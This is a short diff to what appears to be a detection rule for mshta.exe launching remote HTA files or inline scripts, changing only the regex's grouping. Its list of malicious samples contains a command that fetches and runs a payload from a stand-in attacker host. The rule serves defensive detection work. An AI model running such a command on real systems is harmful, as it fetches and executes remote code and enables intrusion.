@@ -4,7 +4,7 @@ description: >
   Detects mshta.exe executing remote HTA files or inline scripts. Commonly abused to bypass application whitelisting.
 
 pattern: |
-  (?i)mshta(\.exe)?\s+(https?://|ftp://|javascript:|vbscript:|about:|data:)
+  (?i)(mshta(\.exe)?\s+(https?://|ftp://|javascript:|vbscript:|about:|data:))
 
 malicious:
   - "mshta http://evil.com/payload.hta"
